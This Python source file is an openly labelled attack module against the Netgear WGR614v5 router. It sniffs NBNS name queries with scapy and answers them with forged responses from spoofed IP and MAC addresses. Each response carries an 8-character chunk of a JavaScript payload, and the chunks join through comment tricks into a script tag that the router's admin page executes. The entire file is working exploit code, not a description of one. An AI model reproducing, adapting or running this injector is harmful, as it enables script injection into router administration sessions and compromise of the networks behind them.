#!/usr/bin/env python
#
# nbns_injector.py: NBNS injection module for use against Netgear wgr614v5
# Copyright (C) 2011 Simon Weber <sweb090@gmail.com>
# Code published under GPLv2; see LICENSE file
#
# Credit to Robert Wesley McGrew for nbnspoof.py (03-27-2007); I used some of his code.
# His information:
# wesley@mcgrewsecurity.com
# http://mcgrewsecurity.com

#Suppress the IPv6 no route warning: http://tech.xster.net/tips/suppress-scapy-ipv6-warning/
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *

class Injector:
   #Goes before the payload in our packet.
   HEAD='\x00\x00\x00\x00\x00\x13\x01'


   #Open and close a payload (this is the javascript "transporter").
   PACK_HEAD=('<script>/*',\
              '*/document./*',\
              '*/write(/*')

   PACK_TAIL=('*/</script>',)

   def __init__(self, verbose, ip_gen, mac_gen, actual_ip, interface, payload, router_ip):
      """Create an injector.

      ip_gen and mac_gen are generators that we get our fake ips/macs from."""
      
      self.router_ip = router_ip
      self.interface = interface
      self.actual_ip = actual_ip
      self.payload = payload
      self.verbose = verbose

      self.ip_gen = ip_gen
      self.mac_gen = mac_gen

      self.responses = None

   def run(self):
      sniff(iface=self.interface,filter="udp and port 137",store=0,prn=self.get_packet)

   def pack_payload(self, request, payload):
      """Create a series of packets that will write the payload to html with javascript.

      Return list of tuples (packet, contents)."""

      responses = list()

      #Add the header.
      for head_piece in Injector.PACK_HEAD:
         responses.append((self.pack_contents(request, head_piece), head_piece))

      #Escape all of the single quotes in the payload. We need to do this since we're going to be surrounding the js strings in single quotes.
      payload = payload.replace("'", "\\'")


      #Write in the payload.
      loc = 0
      while loc < len(payload) - 7:
         contents = "*/'" + payload[loc:loc+8] + "',/*"
         responses.append((self.pack_contents(request, contents), contents))
         loc += 8

      #Write in the last piece (ensure no trailing commas).
      contents = "*/'" + payload[loc:] + "');/*"
      responses.append((self.pack_contents(request, contents), contents))


      for tail_piece in Injector.PACK_TAIL:
         responses.append((self.pack_contents(request, tail_piece), tail_piece))

      return responses

   def get_packet(self, pkt):
      """Handle sniffing a nbns packet."""

      if not pkt.getlayer(NBNSQueryRequest):
         return

      if pkt.FLAGS & 0x8000:
         query = False
      else:
         query = True

      if self.verbose:
         print str(pkt.NAME_TRN_ID) + ":",
         if query:
            print "Q",
         else:
            print "R",
         print "SRC:" + pkt.getlayer(IP).src + " DST:" + pkt.getlayer(IP).dst,
         if query:
            print 'NAME:"' + pkt.QUESTION_NAME + '"'
         else:
            print 'NAME:"' + pkt.QUESTION_NAME + '"'


      #Respond only to packets from: router AND (to: us OR broadcast).
      should_respond = False
      if query:
         src = pkt.getlayer(IP).src
         dest = pkt.getlayer(IP).dst

         if src == self.router_ip and (dest == self.actual_ip or dest[dest.rfind('.') + 1:] == "255"):
            should_respond = True
            

      if should_respond:
         #Need to look at one response to internalize the packet and build the payload.
         #After the first time, we'll inject.
         if self.responses == None:
            self.responses = self.pack_payload(pkt, self.payload)
            print "Ready to inject."

         else:
            #Buffer the output inside the loop.
            #This speeds up sending longer payloads, and increases success rate.
            i=1
            out_buffer = []
            for response, contents in self.responses:
               sendp(response, iface=self.interface, verbose=0)
               if self.verbose:
                  out_buffer.append("  -->    Sent packet " + str(i) + " with contents" +"(" + str(len(contents)) + "): " + contents)
                  i += 1

            if self.verbose:
               print "  --> Responding:"
               print '\n'.join(out_buffer)

      return


   def pack_contents(self, request, contents):
      """Pack a string into a NBNS response to the given request.

      Return a packet."""

      new_ip = self.ip_gen.next()
      new_mac = self.mac_gen.next()

      #Create the packet
      response = Ether(dst=request.src,src=new_mac)
      response /= IP(dst=request.getlayer(IP).src,src=new_ip)
      response /= UDP(sport=137,dport=137)
      response /= NBNSQueryRequest(NAME_TRN_ID=request.getlayer(NBNSQueryRequest).NAME_TRN_ID,\
                                   FLAGS=0x8500,\
                                   QDCOUNT=0,\
                                   ANCOUNT=1,\
                                   NSCOUNT=0,\
                                   ARCOUNT=0,\
                                   QUESTION_NAME=request.getlayer(NBNSQueryRequest).QUESTION_NAME,\
                                   SUFFIX=request.getlayer(NBNSQueryRequest).SUFFIX,\
                                   NULL=0,\
                                   QUESTION_TYPE=request.getlayer(NBNSQueryRequest).QUESTION_TYPE,\
                                   QUESTION_CLASS=request.getlayer(NBNSQueryRequest).QUESTION_CLASS)      
      response /= Raw()


      #Name needs to be padded out to 16 chars with null.
      pad = (16 - len(contents)) * '\x00'
      response.getlayer(Raw).load = Injector.HEAD + contents + pad + '\x00\x00' #Extra nulls part of the protocol.

      return response
